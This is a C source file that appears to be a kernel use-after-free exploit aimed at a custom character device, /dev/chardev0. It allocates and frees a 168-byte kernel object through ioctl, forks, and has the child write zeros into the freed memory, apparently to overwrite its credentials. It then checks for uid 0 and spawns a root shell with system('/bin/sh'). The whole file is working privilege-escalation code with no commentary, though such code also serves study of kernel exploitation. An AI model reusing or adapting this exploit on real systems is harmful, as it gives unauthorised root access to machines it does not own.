#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include "chardev.h"
  
int main()
{
    int fd1,fd2;
 
    if ((fd1 = open("/dev/chardev0", O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }

    if (ioctl(fd1, KMALLOC, 168) < 0){
        printf("Error : SET_DATA.\n");
    }

    ioctl(fd1, KFREE);
  
    int pid = fork();
    printf("PID %d\n",pid);
    if(pid < 0){
        puts("[*] fork error!");
        exit(0);
    }else if(pid == 0){
	char zeros[30] = {0};
	write(fd1, zeros, 28);

	if(getuid() == 0){
		puts("[+] root now.");
		system("/bin/sh");
		exit(0);
	}else{
		printf("UID : %d\n",getuid());
	}
    }else{
	wait(1);
    }

    if (close(fd1) != 0){
        printf("Cannot close.\n");
    }

    return 0;
}
